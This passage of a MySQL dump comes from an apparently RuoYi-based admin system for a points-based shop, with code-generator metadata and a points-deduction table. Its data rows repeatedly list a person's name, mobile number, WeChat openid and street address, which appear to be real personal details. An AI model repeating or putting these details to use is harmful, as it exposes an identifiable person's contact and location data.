INSERT INTO `gen_table` VALUES (1,'HistoricalRecord','',NULL,NULL,'HistoricalRecord','crud','com.ruoyi.project.system','system','HistoricalRecord',NULL,'ruoyi','0','/',NULL,'admin','2022-01-05 20:03:53','',NULL,NULL),(2,'Points','',NULL,NULL,'Points','crud','com.ruoyi.project.system','system','Points',NULL,'ruoyi','0','/',NULL,'admin','2022-01-05 20:03:53','',NULL,NULL),(3,'ShoppingCenter','',NULL,NULL,'ShoppingCenter','crud','com.ruoyi.project.system','system','ShoppingCenter',NULL,'ruoyi','0','/',NULL,'admin','2022-01-05 20:03:53','',NULL,NULL),(4,'UserInformation','',NULL,NULL,'UserInformation','crud','com.ruoyi.project.system','system','UserInformation',NULL,'ruoyi','0','/',NULL,'admin','2022-01-05 20:03:53','',NULL,NULL),(5,'category','商品分类','',NULL,'Category','crud','com.ruoyi.project.system','system','category','商品分类','ruoyi','0','/','{\"parentMenuId\":\"2026\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"商品管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:35:06',''),(6,'demojob','定时任务调度表','',NULL,'Demojob','crud','com.ruoyi.project.system','system','demojob','定时任务调度','ruoyi','0','/','{\"parentMenuId\":\"2000\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"用户信息\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-01-06 11:28:51',''),(7,'jifenminus','积分增加','',NULL,'Jifenminus','crud','com.ruoyi.project.system','system','jifenminus','积分增加','ruoyi','0','/','{\"parentMenuId\":\"2013\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"积分管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:30:18',''),(8,'jifenplus','积分增加','',NULL,'Jifenplus','crud','com.ruoyi.project.system','system','jifenplus','积分增加','ruoyi','0','/','{\"parentMenuId\":\"2013\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"积分管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:36:18',''),(9,'kind','种类','',NULL,'Kind','crud','com.ruoyi.project.system','system','kind','种类','ruoyi','0','/','{\"parentMenuId\":\"2013\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"积分管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:38:16',''),(10,'location','位置列表','',NULL,'Location','crud','com.ruoyi.project.system','system','location','位置列表','ruoyi','0','/','{\"parentMenuId\":\"2000\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"用户信息\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:41:59',''),(11,'lunbo','轮播图','',NULL,'Lunbo','crud','com.ruoyi.project.system','system','lunbo','轮播图','ruoyi','0','/','{\"parentMenuId\":\"2026\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"商品管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:40:19',''),(12,'shoplist','商品列表','',NULL,'Shoplist','crud','com.ruoyi.project.system','system','shoplist','商品列','ruoyi','0','/','{\"parentMenuId\":\"2026\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"商品管理\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:54','','2022-04-04 22:39:31',''),(13,'suggest','建议','',NULL,'Suggest','crud','com.ruoyi.project.system','system','suggest','建议','ruoyi','0','/','{\"parentMenuId\":\"2000\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"用户信息\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:55','','2022-01-06 11:28:01',''),(14,'userinfo','用户信息','',NULL,'Userinfo','crud','com.ruoyi.project.system','system','userinfo','用户信息','ruoyi','0','/','{\"parentMenuId\":\"3\",\"treeName\":\"\",\"treeParentCode\":\"\",\"parentMenuName\":\"系统工具\",\"treeCode\":\"\"}','admin','2022-01-05 20:03:55','','2022-01-05 20:10:59','');
/*!40000 ALTER TABLE `gen_table` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gen_table_column`
--

DROP TABLE IF EXISTS `gen_table_column`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `gen_table_column` (
  `column_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_id` varchar(64) DEFAULT NULL COMMENT '归属表编号',
  `column_name` varchar(200) DEFAULT NULL COMMENT '列名称',
  `column_comment` varchar(500) DEFAULT NULL COMMENT '列描述',
  `column_type` varchar(100) DEFAULT NULL COMMENT '列类型',
  `java_type` varchar(500) DEFAULT NULL COMMENT 'JAVA类型',
  `java_field` varchar(200) DEFAULT NULL COMMENT 'JAVA字段名',
  `is_pk` char(1) DEFAULT NULL COMMENT '是否主键（1是）',
  `is_increment` char(1) DEFAULT NULL COMMENT '是否自增（1是）',
  `is_required` char(1) DEFAULT NULL COMMENT '是否必填（1是）',
  `is_insert` char(1) DEFAULT NULL COMMENT '是否为插入字段（1是）',
  `is_edit` char(1) DEFAULT NULL COMMENT '是否编辑字段（1是）',
  `is_list` char(1) DEFAULT NULL COMMENT '是否列表字段（1是）',
  `is_query` char(1) DEFAULT NULL COMMENT '是否查询字段（1是）',
  `query_type` varchar(200) DEFAULT 'EQ' COMMENT '查询方式（等于、不等于、大于、小于、范围）',
  `html_type` varchar(200) DEFAULT NULL COMMENT '显示类型（文本框、文本域、下拉框、复选框、单选框、日期控件）',
  `dict_type` varchar(200) DEFAULT '' COMMENT '字典类型',
  `sort` int(11) DEFAULT NULL COMMENT '排序',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`column_id`)
) ENGINE=InnoDB AUTO_INCREMENT=105 DEFAULT CHARSET=utf8 COMMENT='代码生成业务表字段';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gen_table_column`
--

LOCK TABLES `gen_table_column` WRITE;
/*!40000 ALTER TABLE `gen_table_column` DISABLE KEYS */;
INSERT INTO `gen_table_column` VALUES (1,'1','openId',NULL,'int(11)','Long','openId','0','0','1','1','1','1','1','EQ','input','',1,'admin','2022-01-05 20:03:53','',NULL),(2,'1','machineId',NULL,'int(11)','Long','machineId','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:53','',NULL),(3,'1','weight',NULL,'int(11)','Long','weight','0','0','1','1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:53','',NULL),(4,'1','date',NULL,'int(11)','Long','date','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:53','',NULL),(5,'2','openId',NULL,'varchar(30)','String','openId','0','0','1','1','1','1','1','EQ','input','',1,'admin','2022-01-05 20:03:53','',NULL),(6,'2','points',NULL,'int(11)','Long','points','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:53','',NULL),(7,'2','weight',NULL,'double','Long','weight','0','0','1','1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:53','',NULL),(8,'2','type',NULL,'int(11)','Long','type','0','0','1','1','1','1','1','EQ','select','',4,'admin','2022-01-05 20:03:53','',NULL),(9,'2','machineId',NULL,'int(11)','Long','machineId','0','0','1','1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:53','',NULL),(10,'2','date',NULL,'datetime','Date','date','0','0','1','1','1','1','1','EQ','datetime','',6,'admin','2022-01-05 20:03:53','',NULL),(11,'2','address',NULL,'varchar(30)','String','address','0','0','1','1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:53','',NULL),(12,'3','goodsName',NULL,'varchar(100)','String','goodsName','0','0','1','1','1','1','1','LIKE','input','',1,'admin','2022-01-05 20:03:53','',NULL),(13,'3','description',NULL,'varchar(200)','String','description','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:53','',NULL),(14,'3','price',NULL,'int(11)','Long','price','0','0','1','1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:53','',NULL),(15,'3','goodsNumber',NULL,'int(11)','Long','goodsNumber','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:53','',NULL),(16,'3','img',NULL,'varchar(200)','String','img','0','0','1','1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:53','',NULL),(17,'3','rollingImg',NULL,'varchar(200)','String','rollingImg','0','0','1','1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:53','',NULL),(18,'4','openId',NULL,'varchar(30)','String','openId','1','0',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:53','',NULL),(19,'4','nickName',NULL,'varchar(30)','String','nickName','0','0','1','1','1','1','1','LIKE','input','',2,'admin','2022-01-05 20:03:53','',NULL),(20,'4','avatar',NULL,'varchar(100)','String','avatar','0','0','1','1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:53','',NULL),(21,'4','sexual',NULL,'int(11)','Long','sexual','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:53','',NULL),(22,'4','city',NULL,'varchar(11)','String','city','0','0','1','1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:54','',NULL),(23,'4','province',NULL,'varchar(11)','String','province','0','0','1','1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:54','',NULL),(24,'4','date',NULL,'datetime','Date','date','0','0','1','1','1','1','1','EQ','datetime','',7,'admin','2022-01-05 20:03:54','',NULL),(25,'5','id','ID','bigint(20)','Long','id','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:35:06'),(26,'5','category','分类Id','varchar(64)','String','category','0','0',NULL,'1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:35:06'),(27,'5','catename','分类名字','varchar(64)','String','catename','0','0',NULL,'1','1','1','1','LIKE','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:35:06'),(28,'5','miaoshu','描述','varchar(64)','String','miaoshu','0','0',NULL,'1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:35:06'),(29,'5','create_time','创建时间','timestamp','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',5,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:35:06'),(30,'6','job_id','任务ID','bigint(20)','Long','jobId','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(31,'6','job_name','任务名称','varchar(64)','String','jobName','1','0',NULL,'1',NULL,NULL,NULL,'LIKE','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(32,'6','job_group','任务组名','varchar(64)','String','jobGroup','1','0',NULL,'1',NULL,NULL,NULL,'EQ','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(33,'6','invoke_target','调用目标字符串','varchar(500)','String','invokeTarget','0','0','1','1','1','1','1','EQ','textarea','',4,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(34,'6','cron_expression','cron执行表达式','varchar(255)','String','cronExpression','0','0',NULL,'1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(35,'6','misfire_policy','计划执行错误策略（1立即执行 2执行一次 3放弃执行）','varchar(20)','String','misfirePolicy','0','0',NULL,'1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(36,'6','concurrent','是否并发执行（0允许 1禁止）','char(1)','String','concurrent','0','0',NULL,'1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(37,'6','status','状态（0正常 1暂停）','char(1)','String','status','0','0',NULL,'1','1','1','1','EQ','radio','',8,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(38,'6','create_by','创建者','varchar(64)','String','createBy','0','0',NULL,'1',NULL,NULL,NULL,'EQ','input','',9,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(39,'6','create_time','创建时间','datetime','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',10,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(40,'6','update_by','更新者','varchar(64)','String','updateBy','0','0',NULL,'1','1',NULL,NULL,'EQ','input','',11,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(41,'6','update_time','更新时间','datetime','Date','updateTime','0','0',NULL,'1','1',NULL,NULL,'EQ','datetime','',12,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(42,'6','remark','备注信息','varchar(500)','String','remark','0','0',NULL,'1','1','1',NULL,'EQ','textarea','',13,'admin','2022-01-05 20:03:54',NULL,'2022-01-06 11:28:51'),(43,'7','id','','int(100)','Long','id','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(44,'7','openid','openid','varchar(30)','String','openid','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(45,'7','name','昵称','varchar(60)','String','name','0','0',NULL,'1','1','1','1','LIKE','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(46,'7','phone','手机','varchar(20)','String','phone','0','0',NULL,'1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(47,'7','address','地址','varchar(60)','String','address','0','0',NULL,'1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(48,'7','address_detail','详细地址','varchar(60)','String','addressDetail','0','0',NULL,'1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(49,'7','jifen','消费数','int(200)','Long','jifen','0','0','1','1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(50,'7','shopid','商品id','int(100)','Long','shopid','0','0','1','1','1','1','1','EQ','input','',8,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(51,'7','shopnum','商品数量','int(100)','Long','shopnum','0','0','1','1','1','1','1','EQ','input','',9,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(52,'7','shopname','商品名称','varchar(64)','String','shopname','0','0',NULL,'1','1','1','1','LIKE','input','',10,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(53,'7','create_time','时间','timestamp','Date','createTime','0','0','1','1',NULL,NULL,NULL,'EQ','datetime','',11,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:30:18'),(54,'8','id','','int(100)','Long','id','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(55,'8','openid','openid','varchar(30)','String','openid','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(56,'8','techid','设备id','varchar(100)','String','techid','0','0','1','1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(57,'8','deviceId','设备蓝牙号','varchar(100)','String','deviceId','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(58,'8','kind','1春夏，2秋冬,3书籍','int(100)','Long','kind','0','0','1','1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(59,'8','weight','重量','varchar(60)','String','weight','0','0','1','1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(60,'8','jifen','增长积分','int(200)','Long','jifen','0','0','1','1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(61,'8','create_time','创建时间','timestamp','Date','createTime','0','0','1','1',NULL,NULL,NULL,'EQ','datetime','',8,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:36:18'),(62,'9','kind','','int(100)','Long','kind','1','0',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:38:16'),(63,'9','kindname','','varchar(45)','String','kindname','0','0','1','1','1','1','1','LIKE','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:38:16'),(64,'9','picture','','longtext','String','picture','0','0','1','1','1','1','1','EQ','textarea','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:38:16'),(65,'9','url','','varchar(100)','String','url','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:38:16'),(66,'10','locid','','int(100)','Long','locid','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(67,'10','openid','openid','varchar(30)','String','openid','0','0','1','1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(68,'10','name','收货人','varchar(60)','String','name','0','0','1','1','1','1','1','LIKE','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(69,'10','phone','电话','varchar(20)','String','phone','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(70,'10','address_detail','详细地址','varchar(60)','String','addressDetail','0','0',NULL,'1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(71,'10','address','地址','varchar(60)','String','address','0','0','1','1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(72,'10','is_default','默认，1正确','tinyint(1)','Integer','isDefault','0','0',NULL,'1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(73,'10','latitude','经度','varchar(100)','String','latitude','0','0','1','1','1','1','1','EQ','input','',8,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(74,'10','longitude','纬度','varchar(100)','String','longitude','0','0','1','1','1','1','1','EQ','input','',9,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(75,'10','province','省份','varchar(20)','String','province','0','0','1','1','1','1','1','EQ','input','',10,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(76,'10','city','城市','varchar(20)','String','city','0','0','1','1','1','1','1','EQ','input','',11,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(77,'10','district','街道','varchar(30)','String','district','0','0','1','1','1','1','1','EQ','input','',12,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:41:59'),(78,'11','id','ID','int(100)','Long','id','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:40:19'),(79,'11','pic','轮播图','longtext','String','pic','0','0',NULL,'1','1','1','1','EQ','textarea','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:40:19'),(80,'11','nav','指向地址','varchar(64)','String','nav','0','0',NULL,'1','1','1','1','EQ','input','',3,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:40:19'),(81,'11','comm','描述','varchar(64)','String','comm','0','0',NULL,'1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:40:19'),(82,'11','create_time','创建时间','timestamp','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',5,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:40:19'),(83,'12','id','ID','int(100)','Long','id','1','1',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:39:31'),(84,'12','category','分类Id','varchar(64)','String','category','0','0',NULL,'1','1','1','1','EQ','input','',2,'admin','2022-01-05 20:03:54',NULL,'2022-04-04 22:39:31'),(85,'12','shopname','名字','varchar(64)','String','shopname','0','0',NULL,'1','1','1','1','LIKE','input','',3,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(86,'12','miaoshu','描述','varchar(64)','String','miaoshu','0','0',NULL,'1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(87,'12','picture','图片','varchar(255)','String','picture','0','0',NULL,'1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(88,'12','kucun','库存','varchar(63)','String','kucun','0','0',NULL,'1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(89,'12','price','价格','varchar(64)','String','price','0','0',NULL,'1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(90,'12','create_time','创建时间','timestamp','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',8,'admin','2022-01-05 20:03:55',NULL,'2022-04-04 22:39:31'),(91,'13','openid','openid','varchar(64)','String','openid','0','0','1','1','1','1','1','EQ','input','',1,'admin','2022-01-05 20:03:55',NULL,'2022-01-06 11:28:01'),(92,'13','nickname','昵称','varchar(50)','String','nickname','0','0',NULL,'1','1','1','1','LIKE','input','',2,'admin','2022-01-05 20:03:55',NULL,'2022-01-06 11:28:01'),(93,'13','avatar','头像','longtext','String','avatar','0','0',NULL,'1','1','1','1','EQ','textarea','',3,'admin','2022-01-05 20:03:55',NULL,'2022-01-06 11:28:01'),(94,'13','suggest','建议','varchar(1000)','String','suggest','0','0',NULL,'1','1','1','1','EQ','textarea','',4,'admin','2022-01-05 20:03:55',NULL,'2022-01-06 11:28:01'),(95,'13','create_time','创建时间','timestamp','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',5,'admin','2022-01-05 20:03:55',NULL,'2022-01-06 11:28:01'),(96,'14','openid','openid','varchar(30)','String','openid','1','0',NULL,'1',NULL,NULL,NULL,'EQ','input','',1,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(97,'14','nickName','昵称','varchar(45)','String','nickName','0','0','1','1','1','1','1','LIKE','input','',2,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(98,'14','avatarUrl','头像','longtext','String','avatarUrl','0','0','1','1','1','1','1','EQ','textarea','',3,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(99,'14','gender','性别','tinyint(1)','Integer','gender','0','0','1','1','1','1','1','EQ','input','',4,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(100,'14','jifen','积分','int(200)','Long','jifen','0','0',NULL,'1','1','1','1','EQ','input','',5,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(101,'14','province','省','varchar(20)','String','province','0','0',NULL,'1','1','1','1','EQ','input','',6,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(102,'14','city','城市','varchar(20)','String','city','0','0',NULL,'1','1','1','1','EQ','input','',7,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(103,'14','userid','','int(200)','Long','userid','0','0',NULL,'1','1','1','1','EQ','input','',8,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59'),(104,'14','create_time','创建时间','timestamp','Date','createTime','0','0',NULL,'1',NULL,NULL,NULL,'EQ','datetime','',9,'admin','2022-01-05 20:03:55',NULL,'2022-01-05 20:10:59');
/*!40000 ALTER TABLE `gen_table_column` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jifenminus`
--

DROP TABLE IF EXISTS `jifenminus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `jifenminus` (
  `id` int(100) NOT NULL AUTO_INCREMENT,
  `openid` varchar(30) NOT NULL COMMENT 'openid',
  `name` varchar(60) DEFAULT NULL COMMENT '昵称',
  `phone` varchar(20) DEFAULT NULL COMMENT '手机',
  `address` varchar(60) DEFAULT NULL COMMENT '地址',
  `address_detail` varchar(60) DEFAULT NULL COMMENT '详细地址',
  `jifen` int(200) NOT NULL COMMENT '消费数',
  `shopid` int(100) NOT NULL COMMENT '商品id',
  `shopnum` int(100) NOT NULL COMMENT '商品数量',
  `shopname` varchar(64) DEFAULT NULL COMMENT '商品名称',
  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=179 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jifenminus`
--

LOCK TABLES `jifenminus` WRITE;
/*!40000 ALTER TABLE `jifenminus` DISABLE KEYS */;
INSERT INTO `jifenminus` VALUES (1,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',466,2,2,NULL,'2021-09-25 09:11:19'),(3,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',466,1,2,NULL,'2021-09-25 09:33:23'),(4,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',466,1,2,NULL,'2021-09-25 09:36:11'),(5,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',233,1,2,NULL,'2021-09-25 09:38:47'),(6,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',233,2,2,NULL,'2021-09-25 09:39:05'),(7,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',233,2,2,NULL,'2021-09-25 09:39:32'),(8,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,2,NULL,'2021-09-25 09:40:25'),(9,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,1,NULL,'2021-09-25 09:41:28'),(10,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,1,NULL,'2021-09-25 09:41:32'),(11,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,2,NULL,'2021-09-25 09:42:21'),(13,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,1,NULL,'2021-09-25 09:43:31'),(14,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,2,1,NULL,'2021-09-25 10:11:41'),(15,'o0fkt45-DHBmncdzIYvNhgxvAjb4','123','15578121155','北京市东城区前门东大街3号首都大酒店B座1层','50',466,2,2,NULL,'2021-09-25 10:11:53'),(16,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',466,2,2,'单片机','2021-09-25 11:30:30'),(17,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区东长安街14号','7#233',466,2,2,'单片机','2021-09-25 11:39:40'),(18,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',466,2,2,'单片机','2021-09-25 11:40:26'),(19,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',466,2,2,'单片机','2021-09-25 11:40:36'),(20,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,1,2,'单片机','2021-09-25 11:41:06'),(21,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',233,1,2,'卫生纸','2021-09-25 11:41:36'),(22,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',66,1,3,'单片机','2021-09-25 11:41:50'),(23,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',466,2,2,'卫生纸','2021-09-26 13:57:01'),(24,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',1631,7,2,'卫生纸','2021-09-26 15:08:39'),(25,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',1631,7,2,'卫生纸','2021-09-26 15:08:39'),(26,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',1631,7,2,'卫生纸','2021-09-26 15:08:40'),(27,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',3029,13,2,'卫生纸','2021-09-26 15:09:05'),(28,'o0fkt45-DHBmncdzIYvNhgxvAjb4','徐鹤翔','17703175244','北京市东城区','7#233',5359,23,2,'卫生纸','2021-09-26 